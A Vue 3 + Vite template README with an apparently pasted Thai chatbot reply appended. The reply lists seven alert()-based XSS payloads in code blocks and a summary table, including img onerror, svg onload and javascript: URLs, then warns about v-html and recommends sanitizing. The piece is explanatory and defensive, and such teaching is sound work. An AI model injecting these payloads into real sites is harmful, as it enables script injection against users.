# Vue 3 + Vite

This template should help get you started developing with Vue 3 in Vite. The template uses Vue 3 `<script setup>` SFCs, check out the [script setup docs](https://v3.vuejs.org/api/sfc-script-setup.html#sfc-script-setup) to learn more.

Learn more about IDE Support for Vue in the [Vue Docs Scaling up Guide](https://vuejs.org/guide/scaling-up/tooling.html#ide-support).

ได้เลย! มีตัวอย่าง **XSS แบบอื่นๆ** ที่อันตราย และ "น่าลอง" อีกเพียบ 🔥  
(แบบที่ Browser ยัง **ปล่อยผ่านได้บ้าง** โดยไม่ block ทันทีเหมือน `<script>`)

---

### 🔥 ตัวอย่าง input เสี่ยง XSS ที่น่าสนใจ

1. **Image Tag with onerror** (ยิงตอนโหลดรูปผิดพลาด)

```html
<img src=x onerror="alert('XSS')">
```

---

2. **SVG Tag with onload** (SVG ก็ยิง JavaScript ได้)

```html
<svg/onload=alert('XSS')>
```

---

3. **Anchor Tag with javascript:** (คลิกลิงก์แล้วโดน)

```html
<a href="javascript:alert('XSS')">Click me</a>
```

(พอกดที่ลิงก์ มันจะรัน `alert('XSS')` ทันที)

---

4. **Iframe Injection** (โหลดเว็บร้าย)

```html
<iframe src="javascript:alert('XSS')"></iframe>
```

(บาง Browser รุ่นเก่าๆ จะโดน)

---

5. **Style Tag with background-image:url(javascript:...)**

```html
<div style="background-image:url('javascript:alert(`XSS`)')">Click here</div>
```

(แต่แบบนี้หลาย browser รุ่นใหม่จะ block แล้วนะ)

---

6. **Math Tag (แบบเนียนๆ)**

```html
<math><mi xlink:href="javascript:alert(1)">CLICK</mi></math>
```

(บาง browser อาจ render แล้วโดน execute)

---

7. **Malformed Tag (HTML ปลอม)**

```html
<details open ontoggle="alert('XSS')">CLICK ME</details>
```

(พอเปิด/ปิด details จะยิง JavaScript ทันที)

---

### 📋 สรุป

| ประเภท | ตัวอย่าง |
|:---|:---|
| Image onerror | `<img src=x onerror=alert(1)>` |
| SVG onload | `<svg/onload=alert(1)>` |
| Link javascript: | `<a href="javascript:alert(1)">CLICK</a>` |
| Iframe src | `<iframe src="javascript:alert(1)">` |
| CSS background | `<div style="background-image:url('javascript:alert(1)')">` |
| Math + xlink | `<math><mi xlink:href="javascript:alert(1)">` |
| Details ontoggle | `<details open ontoggle=alert(1)>` |

---

### ❗ บทเรียนสำคัญ

**XSS ไม่ได้มีแค่ `<script>` เท่านั้น!**  
แต่มัน **สอดแทรกได้หลายแบบมาก** ทั้ง HTML, JS Event, Attribute

**ดังนั้น** เวลารับ input แล้วใช้ `v-html` ต้องระวังแบบสุดๆ หรือ sanitize ทุกครั้งก่อน render

---

### ✨ ถ้าอยากลอง demo ให้ "เห็นเต็มๆ"  
เช่น input 1 ช่อง แล้วใส่อะไรก็ได้ ลองยิงทุกตัวอย่าง XSS แบบ menu เลือก  
เดี๋ยวผมทำ version **Vite + Vue3 + DOMPurify** ให้ลองก็ได้

**เอาไหม?** (เดี๋ยวทำเป็น playground เล็กๆให้เลย สนุกแน่นอน 🚀)  
อยากได้มั้ย? 🎯  
**(ตอบว่าเอาหรือไม่เอาได้เลย!)**

